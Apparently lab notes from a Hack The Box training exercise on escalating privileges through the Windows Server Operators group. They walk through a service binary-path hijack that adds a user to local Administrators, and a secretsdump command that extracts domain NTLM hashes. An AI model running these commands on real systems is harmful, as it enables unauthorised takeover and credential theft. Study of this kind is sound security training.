### Server Operators
The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
## IMPACT
-  ability to control local services running as LocalSystem ( to privesc to root).
- add any user to local administrators group
- `SeBackupPrivilege` and `SeRestorePrivilege`
- dump NTLM hashes for local accounts via

## exploitation examples:
1.  adding any user to administrators

` Modifying the Service Binary Path to cmd and adding our user to administrators via net`
```cmd-session
sc qc AppReadiness
```

`check server operators permissions on appreadiness service`
```cmd-session
c:\Tools\PsService.exe security AppReadiness
```

Let's change the binary path to execute a command which adds our current user to the default local administrators group.

```cmd-session
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

```cmd-session
sc start AppReadiness
```

```cmd-session
net localgroup Administrators
```

`confirm local admin access`
```shell-session
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

If you have **NT SYSTEM or Local Administrator** privileges on the **DC**, you can dump credentials from **LSASS** memory.

`get NTLM Hashes`
```shell-session
 secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```
